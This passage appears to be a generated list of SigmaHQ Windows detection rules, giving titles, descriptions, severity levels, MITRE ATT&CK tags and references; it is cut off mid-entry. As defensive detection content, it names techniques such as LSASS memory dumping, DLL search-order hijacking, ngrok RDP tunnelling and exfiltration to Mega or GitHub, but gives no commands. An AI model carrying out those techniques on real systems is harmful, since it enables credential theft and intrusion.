* https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-test/troubleshoot-windows-defender-test

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md

    
### Windows Defender Exclusions Added
    
    Detects the Setting of Windows Defender Exclusions

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/windefend/win_defender_exclusions.yml
* https://twitter.com/_nullbind/status/1204923340810543109

    
### Microsoft Defender Tamper Protection Trigger
    
    Detects block of attempt to disable real time protection of Microsoft Defender by tamper protection

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/windefend/win_defender_tamper_protection_trigger.yml
* https://bhabeshraj.com/post/tampering-with-microsoft-defenders-tamper-protection

    
### Windows Defender AMSI Trigger Detected
    
    Detects triggering of AMSI by Windows Defender.

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/windefend/win_defender_amsi_trigger.yml
* https://docs.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps

    
### Windows Defender Threat Detected
    
    Detects all actions taken by Windows Defender malware detection engines

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/windefend/win_defender_threat.yml
* https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-test/troubleshoot-windows-defender-test

    
### Windows Defender Malware Detection History Deletion
    
    Windows Defender logs when the history of detected infections is deleted. Log file will contain the message "Windows Defender Antivirus has removed history of malware and other potentially unwanted software".

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/windefend/win_defender_history_delete.yml
* https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-test/troubleshoot-microsoft-defender-test

    
### Ngrok Usage with Remote Desktop Service
    
    Detects cases in which ngrok, a reverse proxy tool, forwards events to the local RDP port, which could be a sign of malicious behaviour

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1090
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/terminalservices/win_terminalservices_rdp_ngrok.yml
* https://twitter.com/tekdefense/status/1519711183162556416?s=12&t=OTsHCBkQOTNs1k3USz65Zg

* https://ngrok.com/

    
### WMI Persistence
    
    Detects suspicious WMI event filter and command line event consumer based on WMI and Security Logs.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1546.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/wmi/win_wmi_persistence.yml
* https://twitter.com/mattifestation/status/899646620148539397

* https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/

    
### Suspicious Rejected SMB Guest Logon From IP
    
    Detect Attempt PrintNightmare (CVE-2021-1675) Remote code execution in Windows Spooler Service

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1110.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/smbclient/win_susp_failed_guest_logon.yml
* https://twitter.com/KevTheHermit/status/1410203844064301056

* https://github.com/hhlxf/PrintNightmare

* https://github.com/afwu/PrintNightmare

    
### PowerShell Network Connections
    
    Detects a Powershell process that opens network connections - check for suspicious target ports and target systems - adjust to your environment (e.g. extend filters with company's ip range')

    * Level: low
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/network_connection/net_connection_win_powershell_network_connection.yml
* https://www.youtube.com/watch?v=DLtJTxMWZ2o

    
### Suspicious Outbound RDP Connections
    
    Detects Non-Standard Tools Connecting to TCP port 3389 indicating possible lateral movement

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.001
    * MITRE: car.2013-07-002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/network_connection/net_connection_win_susp_rdp.yml
* https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708

    
### Microsoft Binary Suspicious Communication Endpoint
    
    Detects an executable in the Windows folder accessing suspicious domains

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1105
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/network_connection/net_connection_win_binary_susp_com.yml
* https://twitter.com/M_haggis/status/900741347035889665

* https://twitter.com/M_haggis/status/1032799638213066752

    
### Download a File with IMEWDBLD.exe
    
    Use IMEWDBLD.exe (built-in to windows) to download a file

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1105
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/network_connection/net_connection_win_imewdbld.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md#atomic-test-10---windows---powershell-download

* https://lolbas-project.github.io/lolbas/Binaries/IMEWDBLD/

    
### Communication To Mega.nz
    
    Detects an executable accessing mega.co.nz, which could be a sign of forbidden file sharing use of data exfiltration by malicious actors

    * Level: high
    * MITRE: attack.exfiltration
    * MITRE: attack.t1567.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/network_connection/net_connection_win_mega_nz.yml
* https://megatools.megous.com/

* https://www.mandiant.com/resources/russian-targeting-gov-business

    
### Rundll32 Internet Connection
    
    Detects a rundll32 that communicates with public IP addresses

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.011
    * MITRE: attack.execution
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/network_connection/net_connection_win_rundll32_net_connections.yml
* https://www.hybrid-analysis.com/sample/759fb4c0091a78c5ee035715afe3084686a8493f39014aea72dae36869de9ff6?environmentId=100

    
### Notepad Making Network Connection
    
    Detects suspicious network connection by Notepad

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.execution
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1055
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/network_connection/net_connection_win_notepad_network_connection.yml
* https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1492186586.pdf

* https://blog.cobaltstrike.com/2013/08/08/why-is-notepad-exe-connecting-to-the-internet/

    
### Suspicious Program Location with Network Connections
    
    Detects programs with network connections running in suspicious files system locations

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1105
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/network_connection/net_connection_win_susp_prog_location_network_connection.yml
* https://docs.google.com/spreadsheets/d/17pSTDNpa0sf6pHeRhusvWG6rThciE8CsXTSlDUAZDyo

    
### Windows Crypto Mining Pool Connections
    
    Detects process connections to a Monero crypto mining pool

    * Level: high
    * MITRE: attack.impact
    * MITRE: attack.t1496
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/network_connection/net_connection_win_crypto_mining.yml
* https://www.poolwatch.io/coin/monero

    
### RDP Over Reverse SSH Tunnel
    
    Detects svchost hosting RDP termsvcs communicating with the loopback address and on TCP port 3389

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1572
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.001
    * MITRE: car.2013-07-002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/network_connection/net_connection_win_rdp_reverse_tunnel.yml
* https://twitter.com/SBousseaden/status/1096148422984384514

    
### Suspicious Dropbox API Usage
    
    Detects an executable that isn't dropbox but communicates with the Dropbox API

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/network_connection/net_connection_win_susp_dropbox_api.yml
* https://app.any.run/tasks/7e906adc-9d11-447f-8641-5f40375ecebb

* https://www.zscaler.com/blogs/security-research/new-espionage-attack-molerats-apt-targeting-users-middle-east

    
### Wuauclt Network Connection
    
    Detects the use of the Windows Update Client binary (wuauclt.exe) to proxy execute code and making a network connections. One could easily make the DLL spawn a new process and inject to it to proxy the network connection and bypass this rule.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/network_connection/net_connection_win_wuauclt_network_connection.yml
* https://dtm.uk/wuauclt/

    
### Microsoft Binary Github Communication
    
    Detects an executable in the Windows folder accessing github.com

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1105
    * MITRE: attack.exfiltration
    * MITRE: attack.t1567.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/network_connection/net_connection_win_binary_github_com.yml
* https://twitter.com/M_haggis/status/900741347035889665

* https://twitter.com/M_haggis/status/1032799638213066752

* https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/exfil/Invoke-ExfilDataToGitHub.ps1

    
### Excel Network Connections
    
    Detects an Excel process that opens suspicious network connections to non-private IP addresses, and attempts to cover CVE-2021-42292. You will likely have to tune this rule for your organization, but it is certainly something you should look for and could have applications for malicious activity beyond CVE-2021-42292.

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1203
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/network_connection/net_connection_win_excel_outbound_network_connection.yml
* https://corelight.com/blog/detecting-cve-2021-42292

    
### Silenttrinity Stager Msbuild Activity
    
    Detects a possible remote connections to Silenttrinity c2

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1127.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/network_connection/net_connection_win_silenttrinity_stager_msbuild_activity.yml
* https://www.blackhillsinfosec.com/my-first-joyride-with-silenttrinity/

    
### RDP to HTTP or HTTPS Target Ports
    
    Detects svchost hosting RDP termsvcs communicating to target systems on TCP port 80 or 443

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1572
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.001
    * MITRE: car.2013-07-002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/network_connection/net_connection_win_rdp_to_http.yml
* https://twitter.com/tekdefense/status/1519711183162556416?s=12&t=OTsHCBkQOTNs1k3USz65Zg

* https://www.mandiant.com/resources/bypassing-network-restrictions-through-rdp-tunneling

    
### Suspicious Outbound Kerberos Connection
    
    Detects suspicious outbound network activity via kerberos default port indicating possible lateral movement or first stage PrivEsc via delegation.

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1558
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1550.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/network_connection/net_connection_win_susp_outbound_kerberos_connection.yml
* https://github.com/GhostPack/Rubeus

    
### Equation Editor Network Connection
    
    Detects network connections from Equation Editor

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1203
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/network_connection/net_connection_win_eqnedt.yml
* https://twitter.com/forensicitguy/status/1513538712986079238

* https://news.sophos.com/en-us/2019/07/18/a-new-equation-editor-exploit-goes-commercial-as-maldoc-attacks-using-it-spike/

    
### Python Initiated Connection
    
    Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation

    * Level: high
    * MITRE: attack.discovery
    * MITRE: attack.t1046
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/network_connection/net_connection_win_python.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1046/T1046.md#atomic-test-4---port-scan-using-python

* https://pypi.org/project/scapy/

    
### Msiexec Initiated Connection
    
    Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.
Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)


    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.007
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/network_connection/net_connection_win_msiexec.yml
* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.007/T1218.007.md

    
### Microsoft Sync Center Suspicious Network Connections
    
    Detects suspicious connections from Microsoft Sync Center to non-private IPs.

    * Level: medium
    * MITRE: attack.t1055
    * MITRE: attack.t1218
    * MITRE: attack.execution
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/network_connection/net_connection_win_susp_outbound_mobsync_connection.yml
* https://redcanary.com/blog/intelligence-insights-november-2021/

    
### Regsvr32 Network Activity
    
    Detects network connections and DNS queries initiated by Regsvr32.exe

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1559.001
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218.010
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/network_connection/net_connection_win_regsvr32_network_activity.yml
* https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/

* https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1117/T1117.md

    
### Suspicious Outbound SMTP Connections
    
    Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel.
The data may also be sent to an alternate network location from the main command and control server. 


    * Level: medium
    * MITRE: attack.exfiltration
    * MITRE: attack.t1048.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/network_connection/net_connection_win_susp_outbound_smtp_connections.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.003/T1048.003.md#atomic-test-5---exfiltration-over-alternative-protocol---smtp

* https://www.ietf.org/rfc/rfc2821.txt

    
### Suspicious Typical Malware Back Connect Ports
    
    Detects programs that connect to typical malware back connect ports based on statistical analysis from two different sandbox system databases

    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1571
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/network_connection/net_connection_win_malware_backconnect_ports.yml
* https://docs.google.com/spreadsheets/d/17pSTDNpa0sf6pHeRhusvWG6rThciE8CsXTSlDUAZDyo

    
### Dllhost Internet Connection
    
    Detects Dllhost that communicates with public IP addresses

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    * MITRE: attack.execution
    * MITRE: attack.t1559.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/network_connection/net_connection_win_dllhost_net_connections.yml
* https://github.com/Neo23x0/sigma/blob/master/rules/windows/network_connection/sysmon_rundll32_net_connections.yml

    
### Remote PowerShell Session
    
    Detects remote PowerShell connections by monitoring network outbound connections to ports 5985 or 5986 from a non-network service account.

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/network_connection/net_connection_win_remote_powershell_session_network.yml
* https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190511223310.html

    
### Unsigned Image Loaded Into LSASS Process
    
    Loading unsigned image (DLL, EXE) into LSASS process

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_unsigned_image_loaded_into_lsass.yml
* https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment

    
### UIPromptForCredentials DLLs
    
    Detects potential use of UIPromptForCredentials functions by looking for some of the DLLs needed for it.

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.collection
    * MITRE: attack.t1056.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_uipromptforcreds_dlls.yml
* https://securitydatasets.com/notebooks/small/windows/06_credential_access/SDWIN-201020013208.html

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.002/T1056.002.md#atomic-test-2---powershell---prompt-user-for-password

* https://docs.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-creduipromptforcredentialsa

    
### Suspicious Load of Advapi31.dll
    
    Detects the load of advapi31.dll by a process running in an uncommon folder

    * Level: informational
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_susp_advapi32_dll.yml
* https://github.com/hlldz/Phant0m

    
### WMI Script Host Process Image Loaded
    
    Detects signs of the WMI script host process %SystemRoot%\system32\wbem\scrcons.exe functionality being used via images being loaded by a process.

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.privilege_escalation
    * MITRE: attack.persistence
    * MITRE: attack.t1546.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_scrcons_imageload_wmi_scripteventconsumer.yml
* https://twitter.com/HunterPlaybook/status/1301207718355759107

* https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/

* https://threathunterplaybook.com/notebooks/windows/08_lateral_movement/WIN-200902020333.html

    
### Suspicious WSMAN Provider Image Loads
    
    Detects signs of potential use of the WSMAN provider from uncommon processes locally and remote execution.

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_wsman_provider_image_load.yml
* https://twitter.com/chadtilbury/status/1275851297770610688

* https://bohops.com/2020/05/12/ws-management-com-another-approach-for-winrm-lateral-movement/

* https://docs.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-architecture

* https://github.com/bohops/WSMan-WinRM

    
### Fax Service DLL Search Order Hijack
    
    The Fax service attempts to load ualapi.dll, which is non-existent. An attacker can then (side)load their own malicious DLL using this service.

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1574.001
    * MITRE: attack.t1574.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_susp_fax_dll.yml
* https://windows-internals.com/faxing-your-way-to-system/

    
### WMI Persistence - Command Line Event Consumer
    
    Detects WMI command line event consumers

    * Level: high
    * MITRE: attack.t1546.003
    * MITRE: attack.persistence
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_wmi_persistence_commandline_event_consumer.yml
* https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/

    
### CLR DLL Loaded Via Office Applications
    
    Detects CLR DLL being loaded by an Office Product

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1204.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_susp_office_dotnet_clr_dll_load.yml
* https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16

    
### Suspicious System.Drawing Load
    
    A General detection for processes loading System.Drawing.ni.dll. This could be an indicator of potential Screen Capture.

    * Level: low
    * MITRE: attack.collection
    * MITRE: attack.t1113
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_susp_system_drawing_load.yml
* https://github.com/OTRF/detection-hackathon-apt29/issues/16

* https://threathunterplaybook.com/evals/apt29/detections/7.A.1_3B4E5808-3C71-406A-B181-17B0CE3178C9.html

    
### CLR DLL Loaded Via Scripting Applications
    
    Detects CLR DLL being loaded by an scripting applications

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1055
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_susp_script_dotnet_clr_dll_load.yml
* https://github.com/tyranid/DotNetToJScript

* https://thewover.github.io/Introducing-Donut/

* https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html

    
### APT PRIVATELOG Image Load Pattern
    
    Detects an image load pattern as seen when a tool named PRIVATELOG is used and rarely observed under legitimate circumstances

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1055
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_usp_svchost_clfsw32.yml
* https://www.fireeye.com/blog/threat-research/2021/09/unknown-actor-using-clfs-log-files-for-stealth.html

    
### Pingback Backdoor
    
    Detects the use of Pingback backdoor that creates ICMP tunnel for C2 as described in the trustwave report

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1574.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_pingback_backdoor.yml
* https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/backdoor-at-the-end-of-the-icmp-tunnel

* https://app.any.run/tasks/4a54c651-b70b-4b72-84d7-f34d301d6406

    
### Abusing Azure Browser SSO
    
    Detects abusing Azure Browser SSO by requesting OAuth 2.0 refresh tokens for an Azure-AD-authenticated Windows user (i.e. the machine is joined to Azure AD and a user logs in with their Azure AD account) wanting to perform SSO authentication in the browser. An attacker can use this to authenticate to Azure AD in a browser as that user.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1574.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_abusing_azure_browser_sso.yml
* https://posts.specterops.io/requesting-azure-ad-request-tokens-on-azure-ad-joined-machines-for-browser-sso-2b0409caad30

    
### Active Directory Kerberos DLL Loaded Via Office Applications
    
    Detects Kerberos DLL being loaded by an Office Product

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1204.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_susp_office_kerberos_dll_load.yml
* https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16

    
### Time Travel Debugging Utility Usage
    
    Detects usage of Time Travel Debugging Utility. Adversaries can execute malicious processes and dump processes, such as lsass.exe, via tttracer.exe.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.credential_access
    * MITRE: attack.t1218
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_tttracer_mod_load.yml
* https://lolbas-project.github.io/lolbas/Binaries/Tttracer/

* https://twitter.com/mattifestation/status/1196390321783025666

* https://twitter.com/oulusoyum/status/1191329746069655553

    
### Wmiprvse Wbemcomn DLL Hijack
    
    Detects a threat actor creating a file named `wbemcomn.dll` in the `C:\Windows\System32\wbem\` directory over the network and loading it for a WMI DLL Hijack scenario.

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1047
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_wmiprvse_wbemcomn_dll_hijack.yml
* https://threathunterplaybook.com/notebooks/windows/08_lateral_movement/WIN-201009173318.html

    
### Load of dbghelp/dbgcore DLL from Suspicious Process
    
    Detects the load of dbghelp/dbgcore DLL (used to make memory dumps) by suspicious processes. Tools like ProcessHacker and some attacker tradecract use MiniDumpWriteDump API found in dbghelp.dll or dbgcore.dll. As an example, SilentTrynity C2 Framework has a module that leverages this API to dump the contents of Lsass.exe and transfer it over the network back to the attacker's machine.

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_susp_dbghelp_dbgcore_load.yml
* https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump

* https://www.pinvoke.net/default.aspx/dbghelp/MiniDumpWriteDump.html

* https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6

    
### Image Load of VSS_PS.dll by Uncommon Executable
    
    Detects the image load of vss_ps.dll by uncommon executables using OriginalFileName datapoint

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.impact
    * MITRE: attack.t1490
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_susp_vss_ps_load.yml
* 1bd85e1caa1415ebdc8852c91e37bbb7

* https://twitter.com/am0nsec/status/1412232114980982787

    
### SILENTTRINITY Stager Execution
    
    Detects SILENTTRINITY stager use

    * Level: high
    * MITRE: attack.command_and_control
    * MITRE: attack.t1071
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_silenttrinity_stage_use.yml
* https://github.com/byt3bl33d3r/SILENTTRINITY

    
### GAC DLL Loaded Via Office Applications
    
    Detects any GAC DLL being loaded by an Office Product

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1204.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_susp_office_dotnet_gac_dll_load.yml
* https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16

    
### Windows Spooler Service Suspicious Binary Load
    
    Detect DLL Load from Spooler Service backup folder

    * Level: informational
    * MITRE: attack.persistence
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1574
    * MITRE: cve.2021.1675
    * MITRE: cve.2021.34527
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_spoolsv_dll_load.yml
* https://github.com/hhlxf/PrintNightmare

* https://github.com/ly4k/SpoolFool

    
### In-memory PowerShell
    
    Detects loading of essential DLL used by PowerShell, but not by the process powershell.exe. Detects meterpreter's "load powershell" extension.

    * Level: medium
    * MITRE: attack.t1059.001
    * MITRE: attack.execution
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_in_memory_powershell.yml
* https://adsecurity.org/?p=2921

* https://github.com/p3nt4/PowerShdll

    
### Alternate PowerShell Hosts
    
    Detects alternate PowerShell hosts potentially bypassing detections looking for powershell.exe

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_alternate_powershell_hosts_moduleload.yml
* https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190610201010.html

    
### PCRE.NET Package Image Load
    
    Detects processes loading modules related to PCRE.NET package

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_pcre_net_load.yml
* https://twitter.com/rbmaslen/status/1321859647091970051

* https://twitter.com/tifkin_/status/1321916444557365248

    
### Mimikatz In-Memory
    
    Detects certain DLL loads when Mimikatz gets executed

    * Level: medium
    * MITRE: attack.s0002
    * MITRE: attack.t1003
    * MITRE: attack.lateral_movement
    * MITRE: attack.credential_access
    * MITRE: car.2019-04-004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_mimikatz_inmemory_detection.yml
* https://securityriskadvisors.com/blog/post/detecting-in-memory-mimikatz/

    
### Python Py2Exe Image Load
    
    Detects the image load of Python Core indicative of a Python script bundled with Py2Exe.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_susp_python_image_load.yml
* https://www.py2exe.org/

* https://unit42.paloaltonetworks.com/unit-42-technical-analysis-seaduke/

    
### FoggyWeb Backdoor DLL Loading
    
    Detects DLL image load activity as used by FoggyWeb backdoor loader

    * Level: critical
    * MITRE: attack.resource_development
    * MITRE: attack.t1587
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_foggyweb_nobelium.yml
* https://www.microsoft.com/security/blog/2021/09/27/foggyweb-targeted-nobelium-malware-leads-to-persistent-backdoor/

    
### dotNET DLL Loaded Via Office Applications
    
    Detects any assembly DLL being loaded by an Office Product

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1204.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_susp_office_dotnet_assembly_dll_load.yml
* https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16

    
### UAC Bypass With Fake DLL
    
    Attempts to load dismcore.dll after dropping it

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    * MITRE: attack.t1574.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_uac_bypass_via_dism.yml
* https://steemit.com/utopian-io/@ah101/uac-bypassing-utility

    
### WMI Modules Loaded
    
    Detects non wmiprvse loading WMI modules

    * Level: informational
    * MITRE: attack.execution
    * MITRE: attack.t1047
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_wmi_module_load.yml
* https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190811201010.html

    
### VBA DLL Loaded Via Microsoft Word
    
    Detects DLL's Loaded Via Word Containing VBA Macros

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1204.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/image_load/image_load_susp_winword_vbadll_load.yml
* https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16

    
### Active Directory Parsing DLL Loaded Via Office Applications
    
    Detects DSParse DLL being loaded by an Office Product

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1204.002
    
References: 
